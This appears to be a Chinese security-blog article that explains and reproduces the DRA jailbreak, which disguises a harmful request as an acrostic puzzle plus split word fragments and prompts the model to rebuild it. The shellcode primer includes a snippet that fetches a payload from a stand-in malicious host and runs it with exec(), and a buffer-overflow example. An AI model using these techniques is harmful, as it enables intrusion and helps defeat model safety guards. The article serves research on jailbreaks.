@@ -1,0 +1,581 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="8fdd5274ff717f934e5bee328b971bec">前言</h1>
+<p>大模型（LLM）自从ChatGPT发布以来，在数据分析、程序合成等各种下游任务中表现出显著的性能。但它们仍面临一些问题，这些问题大大降低了它们的可靠性。</p>
+<p>与传统神经网络一样，大模型容易受到某些风险的攻击，包括对抗攻击、后门攻击和隐私泄露。除此以外，还存在特有的攻击类型，包括提示注入、提示泄露、越狱攻击等。</p>
+<p>如下图所示，大模型所面临的特定攻击一旦发生，可以被操纵用于输出特定的语句、或者泄露之前的提示词等。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231549-2bfade74-9d1b-1.png"/><br/>
+ 而越狱攻击主要关注的是如何绕过大模型固有的安全防护并违反其内容政策。</p>
+<p>之前已经有很多研究成果，可以引导LLM，在特定目标字符串的输入下促进越狱攻击，比如GCG、AutoDAN等工作，都是非常经典的。</p>
+<p>但是考虑到大模型本身对自然语言的理解与处理能力，我们是否可以巧妙地将有害指令的信息整合起来，并提示模型重构它们，从而实现越狱呢？在安全四大顶会，2024 USENIX Security上的工作《Making Them Ask and Answer: Jailbreaking Large Language Models in Few Queries via Disguise and Reconstruction》就实现了这一点，我们将来分析并复现这个工作。</p>
+<p>这种攻击的思路其实很简单，受到了传统软件安全中Shellcode概念的启发。</p>
+<h1 data-content="1" id="2a9a305afa587ebeeec420b0440b2365">Shellcode</h1>
+<p>我们首先来回顾下shellcode。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231600-3274574e-9d1b-1.png"/><br/>
+Shellcode 是一种通常用于利用软件漏洞的恶意代码。它得名于其最初的用途，即通过漏洞在系统中启动一个 shell，从而使攻击者能够控制受害系统。随着安全技术的进步，shellcode 的技术也变得更加复杂，以逃避检测和提高执行成功率。它有三个核心策略：</p>
+<h3 data-content="1" id="66da43fc6ab43610857dd289c851911d">1. 有害指令伪装</h3>
+<p>有害指令伪装（Obfuscation）是指通过混淆技术将恶意代码伪装成无害代码，以躲避安全软件的检测。常见的伪装技术包括：</p>
+<ul>
+<li>
+<strong>编码（Encoding）</strong>：将shellcode用某种编码方式转换，使其在静态分析时不再明显。例如，使用Base64编码、XOR操作等。执行时再进行解码，恢复出原始的shellcode。</li>
+<li>
+<strong>分片（Splitting）</strong>：将shellcode分成多个部分，每个部分单独看起来不像是恶意代码，执行时再重组这些部分。</li>
+<li>
+<strong>垃圾指令插入（Nop Sleds）</strong>：在实际的shellcode指令之间插入无害的、无操作的指令，以增加混淆。</li>
+</ul>
+<h3 data-content="1" id="29fee7546bb094fb56dd13b5b0865940">2. 有效载荷重构</h3>
+<p>有效载荷重构（Payload Reassembly）是指在执行时重组shellcode，使其在传输和存储时看起来不完整或无害，但在运行时能够重构为完整的恶意代码。实现有效载荷重构的技术包括：</p>
+<ul>
+<li>
+<strong>分段加载（Segmented Loading）</strong>：将shellcode分为多个独立的段，每个段分别加载到内存中，最后通过某种机制将这些段连接起来。</li>
+<li>
+<strong>自解压（Self-Extracting）</strong>：将shellcode压缩或加密，执行时通过自解压或自解密程序恢复出完整的shellcode。</li>
+<li>
+<strong>多阶段（Multi-Stage）</strong>：初始阶段的shellcode负责下载或解密后续阶段的shellcode，以便逐步重构完整的有效载荷。</li>
+</ul>
+<h3 data-content="1" id="b5a45c6910f26f404c9a28e6ea06234c">3. 上下文操纵</h3>
+<p>上下文操纵（Context Manipulation）是指通过改变程序或系统的执行上下文来确保shellcode能够成功执行。技术包括：</p>
+<ul>
+<li>
+<strong>堆栈操纵（Stack Pivoting）</strong>：改变程序的堆栈指针，使得程序执行流跳转到攻击者控制的堆栈位置，从而执行shellcode。</li>
+<li>
+<strong>寄存器控制（Register Control）</strong>：通过溢出等漏洞，控制关键寄存器（如指令指针、基址寄存器等），使得shellcode得以执行。</li>
+<li>
+<strong>环境搭建（Environment Preparation）</strong>：在执行shellcode之前，通过修改环境变量、内存布局等，确保shellcode的运行条件得到满足。</li>
+</ul>
+<h3 data-content="1" id="ef699b16321bbe02e0eb09f20b050562">我们来看些实际应用中的例子</h3>
+<ol>
+<li>
+<p><strong>有害指令伪装</strong>：</p>
+<ul>
+<li>使用XOR编码shellcode：编码时用一个密钥对原始shellcode逐字节进行XOR操作，解码时再用相同的密钥还原。</li>
+</ul>
+<pre><code>xor eax, eax          ; 清零eax寄存器
+mov al, 0x4a          ; 加载密钥
+xor byte [esi], al    ; 解码一个字节
+inc esi               ; 移动到下一个字节</code></pre>
+</li>
+<li>
+<p><strong>有效载荷重构</strong>：</p>
+<ul>
+<li>多阶段shellcode：第一阶段的代码下载第二阶段的payload</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://malicious.server/payload"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+<span class="k">exec</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</pre></div>
+</li>
+<li>
+<p><strong>上下文操纵</strong>：</p>
+<ul>
+<li>利用堆栈溢出控制EIP（指令指针）：</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>  <span class="c1">// 没有边界检查，可能导致缓冲区溢出</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>在这个例子中，输入超长字符串可以覆盖返回地址，使得EIP指向攻击者的shellcode。</p>
+</li>
+</ol>
+<p>通过这些核心策略，攻击者可以提高shellcode的隐蔽性和执行成功率，使其能够在受到防御机制保护的环境中执行。这些策略的不断发展也推动了安全研究人员对防御技术的改进。</p>
+<p>那么回到大模型越狱攻击的场景中，我们也可以借鉴这三个策略：有害指令伪装、有效载荷重构和上下文操纵。最初，有害指令以隐蔽的形式伪装起来。然后，我们迫使LLM重构伪装的内容。这一行动旨在让模型说出有害指令（即有效载荷），将其传递到模型的完成中，从而绕过内部安全机制。最后，我们制作提示以促进上下文操纵，巧妙地诱导模型重现有助于促进而不是阻碍有害指令的上下文。</p>
+<h1 data-content="1" id="84f22189ce83470455729063ce784f89">大模型微调存在的风险</h1>
+<p>我们之前大模型在发布之前都会做一些微调，以进一步提升性能。但是在LLMs微调过程中固有的安全偏好及其随后的漏洞也会随之产生。</p>
+<h2 data-content="1" id="906d97e5ae686e7e11e5ed36bd7d218b">对话模版</h2>
+<p>比如大模型在格式化和建模对话的方式。开源LLMs采用对话模板来组织用户查询和模型完成，使用不同的标记将它们分开。例如，LLAMA-2使用下面的模板来格式化对话，其中查询和完成用“[/INST]”隔离开。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231635-4700f4d8-9d1b-1.png"/><br/>
+这种格式化不是表面特性；它使使用这类对话数据集训练的LLMs能够内在地区分查询和完成，这是有效对话建模的关键方面。然而，这种差异揭示了潜在的漏洞，特别是当它与有偏好的微调数据配对时。鉴于查询和完成之间的区别，LLM建模的分布，在查询或完成中以相同上下文为条件时，表现出差异：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231644-4c62fa8e-9d1b-1.png"/><br/>
+其中x代表集成在查询中的上下文，x'指代在完成中存在的上下文，y是模型的响应。当</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241112214716-a0dcc222-a0fc-1.png"/></p>
+<p>表示LLM对有害上下文的安全响应，而</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241112214738-ae007516-a0fc-1.png"/></p>
+<p>与<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241112214728-a834c47a-a0fc-1.png"/><br/>
+不同时，这种差异变得关键。因此，对话建模的差异可能阻碍了对有害上下文的安全响应在完成中的泛化，从而为潜在的漏洞奠定了基础。</p>
+<h2 data-content="1" id="d460ee5c95e841a16b8a91a34fdc8c60">安全偏好</h2>
+<p>微调中的偏好源于目标函数内查询和完成的不同角色。为了理解这种偏好，我们考察三种主要微调方法的目标：监督式微调（SFT）、基于人类反馈的强化学习（RLHF）和直接偏好优化（DPO）。</p>
+<p><strong>监督式微调</strong>：在对齐LLMs的背景下，该方法的目标与预训练阶段相似，即最大化以下函数：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231824-885b76e2-9d1b-1.png"/><br/>
+其中x是包含提示的上下文，通常包括系统生成的提示，y是与x在训练集D_{SFT}中配对的参考答案。</p>
+<p><strong>基于人类反馈的强化学习</strong>：这种技术使用基于人类偏好的数据集来训练静态奖励模型r(x,y)。然后，LLM（策略π_Θ）通过主要是近端策略优化（PPO）的强化学习方法进行训练。PPO的目标函数是：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231840-91b6f50e-9d1b-1.png"/><br/>
+这里，y是从策略π<em>Θ(y|x)的分布中采样的完成，π</em>{\text{ref}}是SFT模型，β是惩罚π<em>Θ与参考策略π</em>{\text{ref}}偏离的系数。策略是使用π_{\text{ref}}的参数初始化的，为进一步优化奠定了基础。</p>
+<p><strong>直接偏好优化</strong>：考虑到奖励模型是优化策略的函数，DPO直接在带有相关偏好标签的完成对上优化策略：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231849-96eba524-9d1b-1.png"/></p>
+<ul>
+<li>其中y_w和y_l分别表示在相同上下文x条件下的首选和较不首选的完成，σ是逻辑函数。</li>
+</ul>
+<p>从上述微调目标中，可以观察到处理用户查询与模型完成之间的差异，从而在训练数据中引入了偏好。具体来说，查询被格式化为上下文x，而完成则作为监督信号（在SFT和DPO中）或由策略生成（在RLHF中）。这种方法虽然对齐LLMs有效，但可能引发两种偏好：</p>
+<ul>
+<li>
+<strong>有害指令的偏好分布</strong>：在SFT和DPO中，有害指令很少出现在完成中，因为训练模型以无害的方式响应是自然的。在RLHF中，策略不太可能生成有害指令，因为它基于SFT模型。因此，LLMs在完成中接触到的有害内容比在查询中少。</li>
+<li>
+<strong>与有害上下文配对的安全响应的偏好联合分布</strong>：查询中有害内容的普遍性表明，在完成中与安全响应配对的有害内容可能较少。因此，这导致在微调数据中响应样本与不同位置的有害上下文配对时的联合分布倾斜，即：</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231859-9d1156ec-9d1b-1.png"/><br/>
+这里，D<em>{\text{declination}}表示包含所有可能拒绝有害内容的响应的集合，而D</em>{\text{cooperation}}包含所有可能促进有害行为的响应。变量x代表将有害内容集成在查询中的上下文，x'指代有害内容出现在完成中的情况。</p>
+<h2 data-content="1" id="599adcb56d5f8d1154b1afcc90cdd0e9">形式化定义</h2>
+<p>给定两个上下文x和x'，LLM π_Θ拒绝x'的可能性小于x，并且促进x'的可能性大于x；在上下文x中，有害内容被放置在查询中，而在x'中，它位于完成中。数学描述如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231915-a64eaf7a-9d1b-1.png"/><br/>
+模型经常在查询中接触到有害上下文，但在完成中则显著减少。随着模型经历微调，它通过对查询中的有害上下文进行安全响应的训练而发展安全对齐，但由于样本不足，其拒绝有害完成的能力仍然发展不足，这导致了越狱攻击漏洞。由于偏好源于对话格式化和微调目标，而不是初始微调数据，因此由此产生的漏洞应该会影响采用类似对话格式化和微调方法的LLMs。与直接将它们插入查询相比，操纵LLM在其完成中构建有害指令可以促进更成功的越狱。</p>
+<p>比如我们可以看如下的例子</p>
+<ul>
+<li>原指令：如何抢劫银行金库</li>
+<li>伪装：通过字谜游戏（acrostic）和单词分割技术进行伪装，例如将“rob”分解并隐藏在随机单词或短语中，然后要求LLM从这些伪装内容中重构原始有害指令。</li>
+</ul>
+<p>这种漏洞的洞察对于制定越狱策略至关重要，因为它可以利用LLMs在完成中对有害内容的保护不足，通过操纵模型在其完成中构建有害指令，从而实现越狱攻击。</p>
+<h1 data-content="1" id="7725b2fdbf2e8eaba9f3b2fd2eb7313d">方案</h1>
+<p>现在我们来看完整的攻击方案。</p>
+<p>我们知道，直接在提示中包含有害指令通常会导致模型拒绝回答。为了绕过这一点，我们引入一种结合伪装和重构的方法，如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231923-ab8b80b2-9d1b-1.png"/><br/>
+这种方法首先伪装有害指令，然后指导模型从伪装内容中重构有害指令，并将有害指令传递到模型的完成部分，利用微调引入的偏见进行越狱。方法包括三个核心组件：有害指令伪装、有效载荷重构和上下文操纵。前两个策略受到软件安全中Shellcode技术的启发。其中反映了Shellcode攻击的两个特点：</p>
+<ol>
+<li>Shellcode总是通过混淆其语义或代码特征来绕过检测。</li>
+<li>一旦混淆，Shellcode被放置在特定的内存空间（例如，可执行段），并在顺序执行过程中恢复为其原始的语义和功能。</li>
+</ol>
+<p>这些特点在所提方法中得到了显著的体现：</p>
+<ol>
+<li>
+<strong>有害指令伪装</strong>。方法将有害指令转换为更隐蔽的形式，旨在减少提示中的有害元素，从而绕过LLMs的内部安全机制。</li>
+<li>
+<strong>有效载荷重构</strong>。利用提示工程引导LLM从伪装内容中重构有害指令。随着LLM顺序处理提示，这种技术将有害语义信息传递到模型的完成部分。</li>
+</ol>
+<p>为了提高越狱的有效性，进一步整合上下文操纵技术，旨在控制模型的输出，为越狱提供更易受攻击的上下文，并丰富有效载荷的上下文场景。</p>
+<h2 data-content="1" id="3f721226fecd4f602bb57b86b75a987d">有害指令伪装</h2>
+<p>许多软件安全研究表明，当Shellcode被混淆时，可以有效地伪装以逃避检测机制。类似地，我们提出可以为越狱任务中的有害指令开发伪装技术，允许它们绕过LLMs的安全检测。因此，对于任何有害指令，根据目标LLMs的反馈自动混淆和优化越狱提示。这里采用两种不同的伪装技术来实现上述想法：基于谜题的混淆和基于单词级别的拆分。</p>
+<p><strong>基于谜题的混淆</strong>。受藏头诗的启发，DRA采用基于谜题的方法适度地掩盖提示，有效地伪装有害指令，确保有害意图被隐藏但可以被LLMs恢复。混淆首先将有害指令的内容分解为单个字符。然后，每个字符被隐藏在一个随机的单词或短语中，并用符号标记（例如，用括号包围）以便于识别，使模型能够从混淆的内容中轻松重构原始有害指令。通过随机选择单词或短语创建的混淆提示具有复杂和模糊的语义，使LLMs难以确定原始有害指令。此外，受心理学中信息过载效应的启发，我们发现字谜占用了大约10%的注意力，减少了LLM对系统提示和潜在有害部分的关注，使越狱更容易。下图就是将有害内容“rob”伪装成混淆谜题的示例。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231934-b1add170-9d1b-1.png"/><br/>
+<strong>基于单词级别的拆分</strong>。自然语言处理中的词汇表外问题（OOV）显著降低了语言模型的性能。受OOV启发，DRA逐字将有害指令拆分成在安全微调中应该很少出现的段落，从而防止模型直接识别有害意图。同时，众所周知，在自然语言中，部分单词或句子片段可以传达大量的语义信息。例如，“how to perfor a cyber attac”可以直观地被识别为“how to perform a cyber attack。”因此，可以利用这种碎片化的思想，使模型能够从未完全的输入中推断出原始的含义或意图。因此，采用动态的基于单词级别的拆分算法，旨在将有害指令的片段插入提示中。这种方法可以避免直接触发固有的安全机制，同时保留可重构的语义。在拆分过程中，根据LLM输出的反馈动态调整自身，有效降低了提示的有害强度。同时，这些插入的单词片段在有效载荷重构阶段充当单词指南，帮助能力较差的模型从未完全的谜题中重构伪装的有害指令。</p>
+<p>下图就是一个单词级别的拆分示例</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231943-b7063284-9d1b-1.png"/><br/>
+在上图中“如何抢劫银行金库”通过两种截断策略，在单词级别拆分后，输入的问题是“Ho to ro a nk vau lt”，其中P代表不进行拆分。</p>
+<p>如下算法显示了整个攻击流程</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231951-bbfd8986-9d1b-1.png"/><br/>
+如下算法则说明了动态单词拆分的过程</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107231958-c046888a-9d1b-1.png"/></p>
+<h2 data-content="1" id="b75df8b45be71219088a080e27dbe635">有效载荷重构</h2>
+<p>现在还需要有害指令在模型的完成中显现，触发微调期间引入的漏洞。因此，所提方案通过提示工程集成一种创新的有效载荷（即原始有害指令）重构技术，旨在将原始有害指令重构到模型的完成段中。伪装和重构的结合不仅绕过了输入阶段的安全检测机制，还使LLM能够从其完成段中理解有害指令的意图，同时触发微调期间引入的安全偏见。为了实现这一点，设计了一个通用且与查询无关的模板，通过简单的提示工程引导LLM从伪装内容中重构有效载荷。如下是载荷重构的示例</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232022-ce74ab8a-9d1b-1.png"/><br/>
+在上述示例中，红色文本代表用于有效载荷重构的查询不可知模板，而蓝色部分代表伪装的有害指令。伪装完成后，伪装的内容将自动嵌入到模板中。LLM首先从字谜中提取标记的字符，然后组装它们，形成初步的重构结果。为了提高LLM重构的准确性，利用单词级别的拆分结果，指导LLM在重构过程中将这些标记片段作为原始有害指令的一部分包含进去。最后迫使LLM将其完成部分传递给有害指令，以供利用。</p>
+<h2 data-content="1" id="b625a2a76cf2f01afaa73981c0bd57ef">上下文操纵</h2>
+<p>为了提高越狱的成功率，根据提示工程整合上下文操纵特性。</p>
+<p>这个模块旨在通过操纵LLM输出实现两个主要目标：</p>
+<ol>
+<li>确保准确完成有效载荷重构任务，利用微调中引入的安全偏见；</li>
+<li>为越狱提供一个生动且适当的上下文背景。鉴于LLMs本质上是一个n-gram模型，适当设置上下文会使LLM更“愿意”合作，从而提高越狱的成功率。</li>
+</ol>
+<p>如下是上下文操纵示例：如何抢劫银行金库</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232031-d40de8cc-9d1b-1.png"/><br/>
+如上所示，红色部分代表了我们广泛适用且与查询无关的上下文操纵提示之一。</p>
+<h1 data-content="1" id="922a38e7a5b1235d93db827c4b9dc017">复现</h1>
+<p>来分析关键的函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232040-d940047e-9d1b-1.png"/><br/>
+这个函数 <code>prefix_gen</code> 的目的是生成一个带有特定前缀的字符串，并将其与原始问题一起返回</p>
+<ol>
+<li>
+<p><strong>参数处理</strong>：</p>
+<ul>
+<li>
+<code>question</code>：输入的字符串问题，将会被处理。</li>
+<li>
+<code>clean</code>：布尔值，指示是否需要在处理前清理问题字符串。如果 <code>clean</code> 为 <code>True</code>，会调用 <code>clean_up</code> 函数来清理 <code>question</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>将问题转换为小写</strong>：</p>
+<ul>
+<li>
+<code>question = question.lower()</code>：将输入的问题转换为小写，以便统一处理。</li>
+</ul>
+</li>
+<li>
+<p><strong>初始化结果字符串</strong>：</p>
+<ul>
+<li>
+<code>res</code>：一个空字符串，用于累积处理后的结果。</li>
+</ul>
+</li>
+<li>
+<p><strong>遍历问题中的每个字母</strong>：</p>
+<ul>
+<li>对于 <code>question</code> 中的每一个字母 <code>letter</code>：<ul>
+<li>如果 <code>letter</code> 不在 <code>LETTER_MAP</code> 字典的键中，将其添加到 <code>LETTER_MAP</code> 中，并将字母本身作为其值的列表。</li>
+<li>从 <code>LETTER_MAP[letter]</code> 对应的列表中随机选择一个 <code>token</code>。</li>
+<li>找到 <code>token</code> 中与 <code>letter</code> 相同的所有位置，并存储它们的索引到 <code>idxs</code> 列表中。</li>
+<li>从 <code>idxs</code> 中随机选择一个索引 <code>mutate</code>。</li>
+<li>将 <code>token</code> 转换为列表，修改 <code>mutate</code> 位置的字符，在字符周围添加括号，例如将 <code>a</code> 改为 <code>(a)</code>。</li>
+<li>将修改后的 <code>token</code> 列表重新连接成字符串 <code>mutate_token</code>。</li>
+<li>将 <code>mutate_token</code> 和一个换行符 <code>\n</code> 追加到 <code>res</code> 字符串中。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>返回结果</strong>：</p>
+<ul>
+<li>函数返回处理后的字符串 <code>res</code> 和原始的 <code>question</code> 字符串。</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232049-de654626-9d1b-1.png"/><br/>
+这段代码定义了一个名为<code>suffix_gen</code>的函数，用于生成提示词的后缀，以用于文本生成任务</p>
+<ol>
+<li>
+<p><strong>加载缓存</strong>：</p>
+<ul>
+<li>
+<code>load_cache(moderation_cache_path)</code> 从指定路径加载缓存文件，其中包含之前的审查结果。如果参数<code>verbose</code>为真，则打印日志信息。</li>
+</ul>
+</li>
+<li>
+<p><strong>解析问题并初始化词指南</strong>：</p>
+<ul>
+<li>将输入问题<code>question</code>分割成单词列表<code>tokens</code>。</li>
+<li>初始化一个空字符串<code>word_guide</code>，用于构建词指南。</li>
+</ul>
+</li>
+<li>
+<p><strong>词指南生成逻辑</strong>：</p>
+<ul>
+<li>遍历<code>tokens</code>中的每个单词<code>token</code>：<ul>
+<li>如果<code>token</code>不在缓存中，调用<code>check_moderation(token)</code>函数检查单词是否需要审查，并将结果存储在缓存中。</li>
+<li>根据审查结果<code>judger</code>，决定如何处理单词：<ul>
+<li>如果<code>token</code>长度不超过2，直接将其添加到<code>word_guide</code>。</li>
+<li>如果<code>token</code>长度不超过4，确保最后一个字符是字母后，裁剪部分字符并添加到<code>word_guide</code>。</li>
+<li>对于其他长度的单词，根据使用的模型决定裁剪策略：<ul>
+<li>
+<strong>GPT-4模型</strong>：<ul>
+<li>使用传入的<code>toxic_trunc</code>参数决定裁剪的起始位置和随机裁剪的字符数。</li>
+<li>根据随机数决定是裁剪前半部分还是后半部分，并添加到<code>word_guide</code>。</li>
+</ul>
+</li>
+<li>
+<strong>其他模型</strong>：<ul>
+<li>根据<code>toxic_trunc</code>参数自动调整裁剪概率。</li>
+<li>裁剪后将前半部分添加到<code>word_guide</code>。</li>
+<li>随机决定是否将后半部分也添加到<code>word_guide</code>，以保留一定的想象空间。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232101-e59935ec-9d1b-1.png"/><br/>
+这段代码进一步处理了不同长度的单词和不同模型的截断策略：</p>
+<ol>
+<li>
+<p><strong>处理缓存中存在的单词</strong>：</p>
+<ul>
+<li>对于长度不超过3的单词，直接将其添加到<code>word_guide</code>。</li>
+<li>对于长度超过3的单词，根据模型选择截断策略：</li>
+</ul>
+</li>
+<li>
+<p><strong>随机截断策略</strong>：</p>
+<ul>
+<li>
+<p><strong>GPT-4模型</strong>：</p>
+<ul>
+<li>设置截断概率上限<code>ub = 3</code>。</li>
+<li>以随机概率决定是否截断，如果随机数为0，则不截断，直接将单词添加到<code>word_guide</code>。</li>
+<li>如果决定截断：<ul>
+<li>根据传入的<code>benign_trunc</code>参数计算截断的起始位置<code>benign_trunc_start</code>。</li>
+<li>随机选择从头部或尾部截断：<ul>
+<li>如果从头部截断，选择一个随机位置<code>idx</code>，从<code>token[idx:]</code>开始截断，并添加到<code>word_guide</code>。</li>
+<li>如果从尾部截断，选择一个随机位置<code>idx</code>，从<code>token[:idx]</code>开始截断，并添加到<code>word_guide</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>其他模型（假设为Llama）</strong>：</p>
+<ul>
+<li>设置截断概率上限<code>ub = 2</code>。</li>
+<li>以随机概率决定是否截断，如果随机数为0，则不截断，直接将单词添加到<code>word_guide</code>。</li>
+<li>如果决定截断：<ul>
+<li>根据传入的<code>benign_trunc</code>参数计算截断的起始位置<code>benign_trunc_start</code>。</li>
+<li>通常从头部截断，选择一个随机位置<code>idx</code>，从<code>token[:idx]</code>开始截断，并添加到<code>word_guide</code>。</li>
+<li>随机决定是否将剩余部分<code>token[idx:]</code>也添加到<code>word_guide</code>，以保留一定的想象空间。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>整体上，这段代码的目的是根据不同模型和输入单词的长度，随机决定是否截断单词，并生成一个合适的词指南。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232210-0e8b3ebe-9d1c-1.png"/><br/>
+主要功能是根据输入的模型名称和问题内容，生成一个后缀字符串，并将一些数据写回缓存：</p>
+<ol>
+<li>
+<strong>随机选择工具</strong>：<ul>
+<li>从 <code>TOOL_LIST</code> 中随机选择两个工具，并将它们用 ' and ' 连接成一个字符串，赋值给 <code>tools</code> 变量。</li>
+</ul>
+</li>
+<li>
+<strong>根据模型名称生成后缀</strong>：<ul>
+<li>检查 <code>model</code> 字符串是否包含 "gpt4"：<ul>
+<li>随机生成一个 0 或 1，如果是 1，则使用 <code>LLAMA_SUFFIX_TOOL_DEV</code> 模板，并插入 <code>word_guide</code> 和 <code>tools</code>，否则使用 <code>LLAMA_SUFFIX_DEV</code> 模板，只插入 <code>word_guide</code>。</li>
+</ul>
+</li>
+<li>检查 <code>model</code> 字符串是否包含 "llama"：<ul>
+<li>如果 <code>question</code> 中不包含 'lyrics of' 或 'long passage'：<ul>
+<li>随机生成一个 0 到 2 的整数，如果是 1 或 2，则使用 <code>LLAMA_SUFFIX_TOOL_DEV</code> 模板，并插入 <code>word_guide</code> 和 <code>tools</code>，然后将反引号替换为双引号。否则使用 <code>LLAMA_SUFFIX_DEV</code> 模板，只插入 <code>word_guide</code>，然后将反引号替换为双引号。</li>
+</ul>
+</li>
+<li>如果 <code>question</code> 中包含 'lyrics of' 或 'long passage'：<ul>
+<li>根据 <code>question</code> 内容设置 <code>tools</code> 为 'lyrics' 或 'long passage'，然后使用 <code>LLAMA_SUFFIX_TOOL</code> 模板，插入 <code>word_guide</code> 和 <code>tools</code>，并将反引号替换为双引号。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<strong>写回缓存</strong>：<ul>
+<li>将 <code>moderation_cache</code> 数据写入到指定路径的文件中，格式为 JSON，缩进为 4 个空格。</li>
+</ul>
+</li>
+<li>
+<strong>返回生成的后缀</strong>：<ul>
+<li>最后返回生成的 <code>suffix</code> 字符串。</li>
+</ul>
+</li>
+</ol>
+<p>在关键函数中涉及的LETTER_MAP如下所示</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232220-14dd3434-9d1c-1.png"/><br/>
+以及模版如下所示</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232230-1a7525d2-9d1c-1.png"/><br/>
+再来分析main函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241107232237-1ee8d28a-9d1c-1.png"/></p>
+<ol>
+<li>
+<p><strong>入口检查</strong>：</p>
+<ul>
+<li>
+<code>if __name__ == "__main__":</code> 这行代码用于检查当前脚本是否作为主程序运行。如果是，它将执行该块中的代码。如果脚本被导入为模块，则不会执行这一块代码。</li>
+</ul>
+</li>
+<li>
+<p><strong>解析输入参数</strong>：</p>
+<ul>
+<li>
+<code>args = parse_args()</code> 调用了一个函数来解析命令行参数，这些参数定义了脚本的运行配置，如是否处于调试模式、使用哪个模型等。</li>
+</ul>
+</li>
+<li>
+<p><strong>调试模式</strong>：</p>
+<ul>
+<li>
+<code>if args.debug:</code> 如果传入的参数指示进入调试模式：<ul>
+<li>
+<code>query = args.query</code> 获取要处理的查询字符串。</li>
+<li>
+<code>attack_kwargs = {"toxic_trunc": 0.5, "benign_trunc": 0.5}</code> 定义一些攻击参数。</li>
+<li>根据选择的模型，使用不同的生成函数来生成提示词。如果模型不是'GPT-4'，调用<code>llama_gen</code>函数；否则，调用<code>gpt4_gen</code>函数。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>非调试模式</strong>：</p>
+<ul>
+<li>
+<code>from harmfulbench_utils import predict</code> 从<code>harmfulbench_utils</code>模块导入预测函数。</li>
+<li>
+<code>attack_config = json.load(open('./attack_config.json', 'r'))</code> 从配置文件中加载攻击配置。</li>
+<li>检查是否有可用的GPU设备，并设置相应的设备（CUDA或CPU）。</li>
+</ul>
+</li>
+<li>
+<p><strong>加载模型</strong>：</p>
+<ul>
+<li>根据选择的模型，加载相应的模型：<ul>
+<li>如果是'GPT-4'或'GPT-3.5'模型，代码目前没有进一步处理。</li>
+<li>如果是'Llama'模型：<ul>
+<li>打印加载模型的日志。</li>
+<li>根据配置文件中指定的路径加载Llama-2模型，并设置模型的设备和参数。</li>
+<li>加载相应的分词器，并设置填充标记。</li>
+<li>打印模型加载完成的日志。</li>
+<li>定义对话提示词<code>conv_prompt</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
